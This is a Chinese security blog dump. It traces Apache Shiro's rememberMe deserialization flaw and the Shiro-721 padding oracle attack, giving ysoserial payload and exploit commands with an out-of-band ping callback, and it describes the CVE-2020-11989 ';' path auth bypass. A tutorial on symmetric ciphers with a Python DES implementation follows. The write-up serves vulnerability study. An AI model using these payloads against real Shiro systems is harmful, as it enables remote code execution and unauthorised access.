加密过程org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin设置断点，点击debug开启tomcat服务，在web端登陆账户，勾选Remember Me按钮，首先代码对调用 forgetIdentity 对subject变量进行处理，跟进此方法，即CookieRememberMeManager类的forgetIdentity 123456789//org.apache.shiro.web.mgt.CookieRememberMeManager protected void forgetIdentity(Subject subject) &#123; if (WebUtils.isHttp(subject)) &#123; HttpServletRequest request = WebUtils.getHttpRequest(subject); HttpServletResponse response = WebUtils.getHttpResponse(subject); this.forgetIdentity(request, response); &#125; &#125; 调用 另一 forgetIdentity 方法处理request和response请求，这里调用了removeFrom方法 1234//org.apache.shiro.web.mgt.CookieRememberMeManagerprivate void forgetIdentity(HttpServletRequest request, HttpServletResponse response) &#123; this.getCookie().removeFrom(request, response); &#125; removeFrom 添加 response 的头部信息 1234567891011121314//org.apache.shiro.web.servlet.SimpleCookie public void removeFrom(HttpServletRequest request, HttpServletResponse response) &#123; String name = this.getName(); String value = \"deleteMe\"; String comment = null; String domain = this.getDomain(); String path = this.calculatePath(request); int maxAge = 0; int version = this.getVersion(); boolean secure = this.isSecure(); boolean httpOnly = false; this.addCookieHeader(response, name, value, (String)comment, domain, path, maxAge, version, secure, httpOnly); log.trace(\"Removed '&#123;&#125;' cookie by setting maxAge=0\", name); &#125; 然后，重新返回到 onSuccessfulLogin 方法 12345678910//org.apache.shiro.mgt.AbstractRememberMeManagerpublic void onSuccessfulLogin(Subject subject, AuthenticationToken token, AuthenticationInfo info) &#123; this.forgetIdentity(subject); if (this.isRememberMe(token)) &#123; this.rememberIdentity(subject, token, info); &#125; else if (log.isDebugEnabled()) &#123; log.debug(\"AuthenticationToken did not indicate RememberMe is requested. RememberMe functionality will not be executed for corresponding account.\"); &#125; &#125; 这里判断是否对token进行了isRememberMe，这个 isRememberMe 看是否在这个web登陆中勾选了remember me，这里已勾选，继续下一步 1234//org.apache.shiro.mgt.AbstractRememberMeManager protected boolean isRememberMe(AuthenticationToken token) &#123; return token != null &amp;&amp; token instanceof RememberMeAuthenticationToken &amp;&amp; ((RememberMeAuthenticationToken)token).isRememberMe(); &#125; 进入 rememberIdentity 方法中,principals 为 用户名 12345//org.apache.shiro.mgt.AbstractRememberMeManager public void rememberIdentity(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo) &#123; PrincipalCollection principals = this.getIdentityToRemember(subject, authcInfo); this.rememberIdentity(subject, principals); &#125; 又调用另外一个重载 rememberIdentity，跟进其方法，通过convertPrincipalsToBytes对accountPrincipals变量进行处理 12345//org.apache.shiro.mgt.AbstractRememberMeManagerprotected void rememberIdentity(Subject subject, PrincipalCollection accountPrincipals) &#123; byte[] bytes = this.convertPrincipalsToBytes(accountPrincipals); this.rememberSerializedIdentity(subject, bytes); &#125; 跟进convertPrincipalsToBytes方法发现它会序列化我们传入的用户名，然后调用encrypt方法加密序列化后的二进制字节。 123456789//org.apache.shiro.mgt.AbstractRememberMeManager protected byte[] convertPrincipalsToBytes(PrincipalCollection principals) &#123; byte[] bytes = this.serialize(principals); if (this.getCipherService() != null) &#123; bytes = this.encrypt(bytes); &#125; return bytes; &#125; 跟进encrypt,使用AES的 CBC分组加密模式，加密秘钥this.getEncryptionCipherKey() 和DEFAULT_CIPHER_KEY_BYTES 一致 1234567891011//org.apache.shiro.mgt.AbstractRememberMeManager protected byte[] encrypt(byte[] serialized) &#123; byte[] value = serialized; CipherService cipherService = this.getCipherService(); if (cipherService != null) &#123; ByteSource byteSource = cipherService.encrypt(serialized, this.getEncryptionCipherKey()); value = byteSource.getBytes(); &#125; return value; &#125; 再返回rememberIdentity，将序列化用户名并AES加密的二进制字节传入rememberSerializedIdentity方法中，进行base64编码，跟进此方法 12345//org.apache.shiro.mgt.AbstractRememberMeManager protected void rememberIdentity(Subject subject, PrincipalCollection accountPrincipals) &#123; byte[] bytes = this.convertPrincipalsToBytes(accountPrincipals); this.rememberSerializedIdentity(subject, bytes); &#125; 将传入的二进制字节进行base64编码并添加到cookie中 123456789101112131415161718//org.apache.shiro.web.mgt.CookieRememberMeManager protected void rememberSerializedIdentity(Subject subject, byte[] serialized) &#123; if (!WebUtils.isHttp(subject)) &#123; if (log.isDebugEnabled()) &#123; String msg = \"Subject argument is not an HTTP-aware instance. This is required to obtain a servlet request and response in order to set the rememberMe cookie. Returning immediately and ignoring rememberMe operation.\"; log.debug(msg); &#125; &#125; else &#123; HttpServletRequest request = WebUtils.getHttpRequest(subject); HttpServletResponse response = WebUtils.getHttpResponse(subject); String base64 = Base64.encodeToString(serialized); Cookie template = this.getCookie(); Cookie cookie = new SimpleCookie(template); cookie.setValue(base64); cookie.saveTo(request, response); &#125; &#125; cookie.saveTo()将cookie的相关属性值添加到reponse请求包头部。 123456789101112public void saveTo(HttpServletRequest request, HttpServletResponse response) &#123; String name = this.getName(); String value = this.getValue(); String comment = this.getComment(); String domain = this.getDomain(); String path = this.calculatePath(request); int maxAge = this.getMaxAge(); int version = this.getVersion(); boolean secure = this.isSecure(); boolean httpOnly = this.isHttpOnly(); this.addCookieHeader(response, name, value, comment, domain, path, maxAge, version, secure, httpOnly);&#125; 加密过程就是将登入的用户名进行反序列化，并用AbstractRememberMeManager类的DEFAULT_CIPHER_KEY_BYTES（硬编码）值做为key，进行AES的CBC分组模式进行加密，然后又base64编码，最后添加到response请求包的set-cookie头部里 解密过程在org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals 方法设置断点调用getRememberedSerializedIdentity处理http请求,跟进此方法，利用this.getCookie().readValue(request, response)读取 cookie 中 rememberMe 的值，并对其值进行base64解码 12345678910111213141516171819202122232425262728293031323334353637//org.apache.shiro.web.mgt.CookieRememberMeManager protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123; if (!WebUtils.isHttp(subjectContext)) &#123; if (log.isDebugEnabled()) &#123; String msg = \"SubjectContext argument is not an HTTP-aware instance. This is required to obtain a servlet request and response in order to retrieve the rememberMe cookie. Returning immediately and ignoring rememberMe operation.\"; log.debug(msg); &#125; return null; &#125; else &#123; WebSubjectContext wsc = (WebSubjectContext)subjectContext; if (this.isIdentityRemoved(wsc)) &#123; return null; &#125; else &#123; HttpServletRequest request = WebUtils.getHttpRequest(wsc); HttpServletResponse response = WebUtils.getHttpResponse(wsc); String base64 = this.getCookie().readValue(request, response); if (\"deleteMe\".equals(base64)) &#123; return null; &#125; else if (base64 != null) &#123; base64 = this.ensurePadding(base64); if (log.isTraceEnabled()) &#123; log.trace(\"Acquired Base64 encoded identity [\" + base64 + \"]\"); &#125; byte[] decoded = Base64.decode(base64); if (log.isTraceEnabled()) &#123; log.trace(\"Base64 decoded byte array length: \" + (decoded != null ? decoded.length : 0) + \" bytes.\"); &#125; return decoded; &#125; else &#123; return null; &#125; &#125; &#125; &#125; 再返回getRememberedPrincipals方法，调用this.convertBytesToPrincipals(bytes, subjectContext)，对rememberMe的base64解码后的值进行处理，跟进此方法，convertBytesToPrincipals 对传入的二进制字符串进行解密和反序列化操作。可以跟进decrypt方法查看具体的解密操作。 12345678//org.apache.shiro.mgt.AbstractRememberMeManager protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) &#123; if (this.getCipherService() != null) &#123; bytes = this.decrypt(bytes); &#125; return this.deserialize(bytes); &#125; decrypt方法中的调用 AES 的 CBC 模式进行解密，key为硬编码的值。 1234567891011//org.apache.shiro.mgt.AbstractRememberMeManager protected byte[] decrypt(byte[] encrypted) &#123; byte[] serialized = encrypted; CipherService cipherService = this.getCipherService(); if (cipherService != null) &#123; ByteSource byteSource = cipherService.decrypt(encrypted, this.getDecryptionCipherKey()); serialized = byteSource.getBytes(); &#125; return serialized; &#125; 所以解密过程为加密过程的相反操作，如果得知AES算法中的key（硬编码），就可以构造任意的反序列化字符串，进行RCE。 修复方式： 官方针对这个问题的修复方式： 1、删除相关默认密钥 2、如果没有配置密钥，会随机生成一个密钥。 Shiro Padding Oracle Attack（Shiro-721 CVE-2019-12422）Shiro实用AES-CBC模式进行加解密，存在Padding Oracle Attack漏洞，已登录的攻击者同样可进行反序列化操作。 影响范围：Apache Shiro &lt; 1.4.2利用条件：1.攻击者知道密文和初始向量IV2.padding错误和padding正确服务器可返回不一样的状态 攻击效果：正常CBC解密需要知道IV、Key、密文，而通过Padding Oracle漏洞，只用知道IV、密文即可获得明文 shiro-1.25以前，AES密钥是硬编码到源码中的，因此可以更改RememberMe的值进行反序列化RCE 而1.2.5之后，shiro采用了随机密钥，也就引出了SHIRO-721，通过padding oracle attack的方式得到， 根据p0师傅之前的文章，在shiro中，当我们更改padding值时，padding正确但反序列化错误则会爆deserialize error；padding错误爆padding error RememberMe使用AES-128-CBC模式加密，容易受到Padding Oracle攻击，AES的初始化向量iv就是rememberMe的base64解码后的前16个字节，攻击者只要使用有效的RememberMe cookie作为Padding Oracle Attack 的前缀，然后就可以构造RememberMe进行反序列化攻击，攻击者无需知道RememberMe加密的密钥。 漏洞利用环境配置 1234git clone https://github.com/3ndz/Shiro-721.gitcd Shiro-721/Dockerdocker build -t shiro-721 .docker run -p 8080:8080 -d shiro-721 攻击流程： 登录网站（勾选Remember），并从Cookie中获取合法的RememberMe。 使用RememberMe cookie作为Padding Oracle Attack的前缀。 加密 ysoserial 的序列化 payload，以通过Padding Oracle Attack制作恶意RememberMe。 重放恶意RememberMe cookie，以执行反序列化攻击 1.登录 Shiro 测试账户获取合法 Cookie（勾选Remember Me）(1) 认证失败时会设置deleteMe的cookie: (2) 认证成功则不会设置deleteMe的cookie:根据以上条件我们的思路是在正常序列化数据（需要一个已知的用户凭证获取正常序列化数据）后利用 Padding Oracle 构造我们自己的数据（Java序列化数据后的脏数据不影响反序列化结果），此时会有两中情况: 构造的数据不能通过字符填充验证，返回deleteme; 构造的数据可以成功解密通过字符填充验证，之后数据可以正常反序列化，不返回deleteme的cookie. 获取cookie2.生成java payload 1java -jar ysoserial.jar CommonsBeanutils1 \"ping awa4xw.ceye.io\" &gt; payload.class 3.执行exp，经过了几十分钟的爆破，得到padding oracle attack后的cookie 1python2 shiro_exp.py http://192.168.247.130:8080/ NqoZZVVnFvBxH0m7tavNPhx2H2mPLucccvcuM3WSSIQIWyksw3xnNG70MWsSy+TFCUZEkiQSdV38fTmfJgsuEJPFLUrVQUwDkZ+disZ5k1auCE2swMsLE7cUxDykdPk79k6Q0k6N8rZpszd/1+F6uoA8PDH9zaYt7RwXUS2z+JKFV30Cl7h0zZvlKYK98DrITFX8sW0Z/veIgh6G3ljIAIo6CgRUKMwYsi1dfD+HeE5qxTpofOfyuUnkguzY//gvEahmxWy85qMBgSchENUn+aKOFWnrtEvTQ3bOhN3T5Lb2zz0waCSpFEyC+tBDYxUWiiANjJnkUf/KtOZ/tQheAjZezmBymL5qOQJPMaVuGyQtX7AGIhn3r3wrLdQsCog4NzCM5EcaNV4zuGEXL4Mfnk0xh7Lv4O04c931gCRM6zv5hB743NwjdO72hc1TcC/CYLRjfs5rUWHerNClnBJhw5h+pQuJdZ0qsv95aC0Qeh4ywpQKELPfpbuZNEd1zt75 payload.class 4.复制该cookie，然后重放一下数据库，即可成功执行命令 漏洞分析Apache Shiro权限绕过漏洞分析(CVE-2020-11989)详情可看： https://xz.aliyun.com/t/7964 影响范围 Apache Shiro &lt; 1.5.3 Spring 框架中只使用 Shiro 鉴权 利用条件： 应用不能部署在根目录，也就是需要context-path，server.servlet.context-path=/test，如果为根目录则context-path为空，就会被CVE-2020-1957的patch将URL格式化，值得注意的是若Shiro版本小于1.5.2的话那么该条件就不需要。 Spring控制器中没有另外的权限校验代码 如果直接访问 /test/admin/page ，会返回302跳转要求登录但是访问 /;/test/admin/page , 就能直接绕过Shiro权限验证，访问到/admin路由中的信息漏油缘由：Tomcat判断/;test/admin/page 为test应用下的/admin/page路由，进入到Shiro时被;截断被认作为/,再进入Spring时又被正确处理为test应用下的/admin/page路由，最后导致shiro的权限绕过。 另外一种思路： https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/ 参考文章： Apache Shiro权限绕过漏洞分析(CVE-2020-11989) ：https://xz.aliyun.com/t/7964Apache Shiro 身份验证绕过漏洞 (CVE-2020-11989)： https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/Shiro反序列化漏洞分析Shiro反序列化分析带思路及组件检测笔记：https://xz.aliyun.com/t/8997Shiro反序列化漏洞利用汇总:https://cloud.tencent.com/developer/article/1657019Shiro Padding Oracle Attack 反序列化：anquanke.com/post/id/200793Shiro 721 Padding Oracle攻击漏洞分析:https://www.anquanke.com/post/id/193165从更深层面看Shiro Padding Oracle漏洞:https://www.anquanke.com/post/id/203869Apache Shiro Padding Oracle反序列化漏洞分析（下）:https://milkfr.github.io/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2020/02/09/analysis-shiro-padding-oracle-2/","categories":[],"tags":[]},{"title":"对称加密算法","slug":"对称加密算法","date":"2021-01-25T08:00:37.000Z","updated":"2021-01-26T15:16:49.792Z","comments":true,"path":"article/f10abbf9.html","link":"","permalink":"https://blog.cfyqy.com/article/f10abbf9.html","excerpt":"对称密码算法有时又叫传统密码算法、秘密密钥算法或单密钥算法。对称密码算法的加密密钥能够从解密密钥中推算出来，反过来也成立。在大多数对称算法中，加密解密密钥是相同的。它要求发送者和接收者在安全通信之前，商定一个密钥。对称算法的安全性依赖于密钥，泄漏密钥就意味着任何人都能对消息进行加密解密。只要通信需要保密，密钥就必须保密。","text":"对称密码算法有时又叫传统密码算法、秘密密钥算法或单密钥算法。对称密码算法的加密密钥能够从解密密钥中推算出来，反过来也成立。在大多数对称算法中，加密解密密钥是相同的。它要求发送者和接收者在安全通信之前，商定一个密钥。对称算法的安全性依赖于密钥，泄漏密钥就意味着任何人都能对消息进行加密解密。只要通信需要保密，密钥就必须保密。 对称算法又可分为两类。一次只对明文中的单个位（有时对字节）运算的算法称为序列算法或序列密码。另一类算法是对明文的一组位进行运算，这些位组称为分组，相应的算法称为分组算法或分组密码。现代计算机密码算法的典型分组长度为64位――这个长度既考虑到分析破译密码的难度，又考虑到使用的方便性。后来，随着破译能力的发展，分组长度又提高到128位或更长。 对称密码常用的数学运算对称密码当中有几种常用到的数学运算。这些运算的共同目的就是把被加密的明文数码尽可能深地打乱，从而加大破译的难度。 ◆移位和循环移位 移位就是将一段数码按照规定的位数整体性地左移或右移。循环右移就是当右移时，把数码的最后的位移到数码的最前头，循环左移正相反。例如，对十进制数码12345678循环右移1位（十进制位）的结果为81234567，而循环左移1位的结果则为23456781。◆置换 就是将数码中的某一位的值根据置换表的规定，用另一位代替。它不像移位操作那样整齐有序，看上去杂乱无章。这正是加密所需,被经常应用。◆扩展 就是将一段数码扩展成比原来位数更长的数码。扩展方法有多种,例如,可以用置换的方法，以扩展置换表来规定扩展后的数码每一位的替代值。◆压缩 就是将一段数码压缩成比原来位数更短的数码。压缩方法有多种，例如，也可以用置换的方法，以表来规定压缩后的数码每一位的替代值。◆异或 这是一种二进制布尔代数运算。异或的数学符号为⊕ ，它的运算法则如下： 12341⊕1 = 00⊕0 = 01⊕0 = 10⊕1 = 1 也可以简单地理解为，参与异或运算的两数位如相等，则结果为0，不等则为1。◆迭代 迭代就是多次重复相同的运算，这在密码算法中经常使用，以使得形成的密文更加难以破解。 DESDES算法为密码体制中的对称密码体制。需要加密的明文按64位进行分组，加密密钥是根据用户输入的秘钥生成的，密钥长64位，但密钥事实上是56位参与DES运算（第8、16、24、32、40、48、56、64位是校验位， 使得每个密钥都有奇数个1，在计算密钥时要忽略这8位），分组后的明文组和56位的密钥按位替代或交换的方法形成密文组的加密方法 DES算法加密流程描述 ：（1）输入64位明文数据，并进行初始置换IP；（2）在初始置换IP后，明文数据再被分为左右两部分，每部分32位，以L0，R0表示；（3）在秘钥的控制下，经过16轮运算(f)；（4）16轮后，左、右两部分交换，并连接再一起，再进行逆置换；（5）输出64位密文。 python实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245# -- coding: utf-8 ---import libnumimport binasciiimport base64#IP置换表 表示源数据的位置IP_table=[58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8, 57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3, 61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7]#逆IP置换表IP_table_=[40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31, 38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29, 36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27, 34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25]#密钥生成的置换表1 去校验位 64bit-&gt;56bitPC_1=[ 57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44, 36, 63, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28, 20, 12, 4]#密钥生成的置换压缩表2 56bit-&gt;48bitPC_2=[14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10, 23, 19, 12, 4, 26, 8, 16, 7, 27, 20, 13, 2, 41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48, 44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32]#S盒中的S1盒S1=[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7, 0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8, 4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0, 15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]#S盒中的S2盒S2=[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10, 3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5, 0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15, 13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9]#S盒中的S3盒S3=[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8, 13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1, 13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7, 1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12]#S盒中的S4盒S4=[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15, 13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9, 10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4, 3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14]#S盒中的S5盒S5=[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9, 14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6, 4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14, 11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3]#S盒中的S6盒S6=[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11, 10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8, 9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6, 4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13]#S盒中的S7盒S7=[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1, 13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6, 1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2, 6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12]#S盒中的S8盒S8=[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7, 1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2, 7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8, 2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]# S盒S=[S1,S2,S3,S4,S5,S6,S7,S8]#P盒P_table=[16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31, 10, 2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25]#用于对数据进行扩展置换 32bit-&gt;48bitE_table=[32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9, 10, 11, 12, 13, 12, 13, 14, 15, 16, 17, 16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25, 24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32,1]#按位异或函数def Xor(a,b): temp='' for i in range(len(a)): temp+=chr((ord(a[i])-48)^(ord(b[i])-48)+48) return temp#置换表函数def Change(a,table): temp_R = '' for i in table: temp_R += a[i - 1] return temp_Rdef S_Change(m): result='' #print len(m) #48位 for i in range(len(m)/6): temp_m=m[6*i:6*(i+1)] line=(ord(temp_m[0])-48)*2+(ord(temp_m[5])-48) ranks=(ord(temp_m[1])-48)*8+(ord(temp_m[2])-48)*4+(ord(temp_m[3])-48)*2+(ord(temp_m[4])-48) result+=('&#123;:04b&#125;'.format(S[i][line*16+ranks])) #十进制转换为4位二进制 高位补零 #print result return result#生成16组密钥的F函数def F(R,key): #扩展置换E #print R R = Change(R,E_table) #print 'R:'+R #print 'key:'+key temp_R=Xor(R,key) #和变换后的48bit key异或 #print temp_R temp_R=S_Change(temp_R) # 八个置换盒 48bit-&gt;32bit #print len(temp_R) #32bit temp_R=Change(temp_R,P_table) return temp_R#PKCS7Padding:def Padding(m): if len(m)%8==0: # m+='\\x08'*8 #根据填充方式不同而选择 m=m else: #m+=unichr(8-(len(m)%8))*(8-(len(m)%8)) #填充Unicode编码数据 m+='\\00'*(8-(len(m)%8)) return m#16轮加密def Des_decode(m,k): #print m m=Change(m,IP_table) #IP置换 L=m[0:32] R=m[32:64] ''' print 'L:' + L, len(L) print 'R:' + R, len(R) ''' for i in range(15): Temp=R R=Xor(L,F(R,k[i])) L=Temp temp_m=Xor(L,F(R,k[15]))+R return Change(temp_m,IP_table_)#生成16轮密钥def Create_key(k): key = [''] * 16 # 去校验码置换1 k=Change(k,PC_1) #print 'temp_k1:' + temp_k1, len(temp_k1) # 16轮密钥生成 for i in range(1,17): C=k[0:28] D=k[28:56] ''' print 'C:'+C,len(C) print 'D:'+D,len(D) ''' # 循环左移 if i==1 or i==2 or i==9 or i==16 : # 1,2,9,16轮循环左移1位 C = C[1:] + C[:1] D = D[1:] + D[:1] else: # 其余轮数循环左移2位 C = C[2:] + C[:2] D = D[2:] + D[:2] k=C+D # 更新k #print len(k) #56位 # 压缩置换2 生成密钥 56-&gt;48 new_k = Change(k, PC_2) key[i-1]=new_k ''' print key for i in key: print i ''' return key#分组/padding/生成16组密钥def Des(m,k): cipher = '' ''' print \"after padding:\", print hex(libnum.s2n(m)),len(m) print \"k:\"+k ''' #key=Create_key(k) #print key for i in range(len(m)/8): #print m[8*i:8*(i+1)],libnum.s2b(m[8*i:8*(i+1)]),len(libnum.s2b(m[8*i:8*(i+1)])) cipher+=Des_decode(libnum.s2b(m[8*i:8*(i+1)]),k) return cipherif __name__=='__main__': ''' while(1): key = raw_input(\"Enter key of 8bytes:\") #8位key if len(key)==8: break print \"error length\" message =raw_input(\"Enter message of any length:\") ''' key='abcdefgh' message='a' message = Padding(message) #padding key = Create_key(libnum.s2b(key)) #create key 字符串转二进制 print binascii.b2a_hex(message) # 字符串转对应16进制ASCII码 cipher=Des(message,key) #加密 print \"cipher二进制:\" + cipher print \"cipher十六进制:\"+hex(int(cipher, 2))[2:] key=key[::-1] if hex(int(cipher, 2))[-1]=='L': cipher = Des(hex(int(cipher, 2))[2:-1].decode('hex'), key) #解密 要去掉末尾的'L' else: cipher = Des(hex(int(cipher, 2))[2:].decode('hex'), key) # 解密 print \"message二进制:\" + cipher print \"message十六进制:\" + hex(int(cipher, 2))[2:] #print base64.b64encode(hex(int(cipher, 2))[2:].decode('hex') ) #二进制字符串识别成十进制 #print len(cipher) 3DES由于DES密码长度容易被暴力破解，所以3DES算法通过对DES算法进行改进，增加DES的密钥长度来避免类似的攻击，针对每个数据块进行三次DES加密；因此，3DES加密算法并非什么新的加密算法，是DES的一个更安全的变形，它以DES为基本模块，通过组合分组方法设计出分组加密算法。。 加/解密过程该算法的加解密过程分别是对明文/密文数据进行三次DES加密或解密，得到相应的密文或明文。 假设EK（）和DK（）分别表示DES的加密和解密函数，P表示明文，C表示密文，那么加解密的公式如下：加密：C = EK3（ DK2（ EK1（P）） ），即对明文数据进行，加密 –&gt; 解密 –&gt; 加密的过程，最后得到密文数据；解密：P = DK1（ EK2（ DK3（C）） ），即对密文数据进行，解密 –&gt; 加密 –&gt; 解密的过程，最后得到明文数据； 其中：K1表示3DES中第一个8字节密钥，K2表示第二个8字节密钥，K3表示第三个8字节密钥，K1、K2、K3决定了算法的安全性，若三个密钥互不相同，本质上就相当于用一个长为168位的密钥进行加密。多年来，它在对付强力攻击时是比较安全的。若数据对安全性要求不那么高，K1可以等于K3。在这种情况下，密钥的有效长度为112位，即K1对应KL（左8字节），K2对应KR（右8字节），K3对应KL（左8字节）。 当三重密钥均相同时，前两步相互抵消，相当于仅实现了一次加密，因此可实现对普通DES加密算法的兼容。 AESAES为分组密码，分组密码也就是把明文分成一组一组的，每组长度相等，每次加密一组数据，直到加密完整个明文。在AES标准规范中，分组长度只能是128位，也就是说，每个分组为16个字节（每个字节8位）。密钥的长度可以使用128位、192位或256位。密钥的长度不同，推荐加密轮数也不同，如下表所示： AES 密钥长度（32位比特字) 分组长度(32位比特字) 加密轮数 AES-128 4 4 10 AES-192 6 4 12 AES-256 8 4 14 轮数在下面介绍，这里实现的是AES-128，也就是密钥的长度为128位，加密轮数为10轮。上面说到，AES的加密公式为C = E(K,P)，在加密函数E中，会执行一个轮函数，并且执行10次这个轮函数，这个轮函数的前9次执行的操作是一样的，只有第10次有所不同。也就是说，一个明文分组会被加密10轮。AES的核心就是实现一轮中的所有操作。 AES的处理单位是字节，128位的输入明文分组P和输入密钥K都被分成16个字节，分别记为P = P0 P1 … P15 和 K = K0 K1 … K15。如，明文分组为P = abcdefghijklmnop,其中的字符a对应P0，p对应P15。一般地，明文分组用字节为单位的正方形矩阵描述，称为状态矩阵。在算法的每一轮中，状态矩阵的内容不断发生变化，最后的结果作为密文输出。该矩阵中字节的排列顺序为从上到下、从左至右依次排列，如下图所示：现在假设明文分组P为”abcdefghijklmnop”，则对应上面生成的状态矩阵图如下：上图中，0x61为字符a的十六进制表示。可以看到，明文经过AES加密后，已经面目全非。 类似地，128位密钥也是用字节为单位的矩阵表示，矩阵的每一列被称为1个32位比特字。通过密钥编排函数该密钥矩阵被扩展成一个44个字组成的序列W[0],W[1], … ,W[43],该序列的前4个元素W[0],W[1],W[2],W[3]是原始密钥，用于加密运算中的初始密钥加（下面介绍）;后面40个字分为10组，每组4个字（128比特）分别用于10轮加密运算中的轮密钥加，如下图所示：上图中，设K = “abcdefghijklmnop”，则K0 = a, K15 = p, W[0] = K0 K1 K2 K3 = “abcd”。 AES的整体结构如下图所示，其中的W[0,3]是指W[0]、W[1]、W[2]和W[3]串联组成的128位密钥。加密的第1轮到第9轮的轮函数一样，包括4个操作：字节代换、行位移、列混合和轮密钥加。最后一轮迭代不执行列混合。另外，在第一轮迭代之前，先将明文和原始密钥进行一次异或加密操作。上图也展示了AES解密过程，解密过程仍为10轮，每一轮的操作是加密操作的逆操作。由于AES的4个轮操作都是可逆的，因此，解密操作的一轮就是顺序执行逆行移位、逆字节代换、轮密钥加和逆列混合。同加密操作类似，最后一轮不执行逆列混合，在第1轮解密之前，要执行1次密钥加操作 分组密码模式DES 和 AES 都属于分组密码，他们只能加密固定长度的明文。分组加密会将明文消息划分为固定大小的块，每块明文分别在密钥控制下加密为密文。当然并不是每个消息都是相应块大小的整数倍，所以我们可能需要进行填充。 ECBECB 模式全称为电子密码本模式（Electronic codebook），在ECB模式中，将明文分组加密之后的结果将直接成为密文分组。加密：解密：攻击方式直接找几组不同的密文，然后截取再拼接进行重放攻击 CBCCBC 全称为密码分组链接（Cipher-block chaining） 模式。在CBC模式中，首先将明文分组与前一个密文分组进行XOR运算，然后再进行加密。加密：解密：CBC字节翻转攻击Padding oracle attack填充提示攻击是一种利用分组密码中的填充部分来进行攻击的方法，在分组密码中，当明文长度不为分组长度的整数倍时，需要在最后一个分组中填充一些数据使其凑满一个分组长度。 https://www.freebuf.com/articles/web/15504.html CFBCFB 